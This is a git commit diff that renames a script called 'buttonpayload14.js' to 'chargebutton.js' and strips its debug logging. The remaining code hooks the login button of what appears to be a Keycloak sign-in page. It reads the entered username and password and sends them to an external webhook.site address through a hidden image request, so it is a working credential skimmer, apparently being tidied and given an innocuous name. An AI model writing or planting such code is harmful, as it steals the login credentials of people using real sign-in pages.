20e24582db782fbfaa09fb38042137ce7d83b814
Jok3r <115065483+Vault-of-Jok3r@users.noreply.github.com>
2025-03-11 14:35:09 +0100

    Update and rename buttonpayload14.js to chargebutton.js

--- chargebutton.js
+++ chargebutton.js
@@ -1,23 +1,14 @@
-console.log('Payload bouton chargé !');
-
 var btn = document.getElementById('kc-login');
 
 if (btn) {
     btn.onclick = function() {
-        //alert('Test.js');
         var passwordInput = document.getElementById('password');
         if (passwordInput) {
             passwordInput.type = 'text';
-            console.log('Le mot de passe est maintenant visible !');
         }
         var username = document.getElementById('username').value;
         var password = document.getElementById('password').value;
-        //onclick="this.disabled = 'disabled';submit();"
-        console.log(username);
-        console.log(password);
         
         new Image().src = 'https://webhook.site/45ade011-e017-4fe9-b767-df5008d430ee/?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
     };
-} else {
-    console.log('Bouton non trouvé');
 }
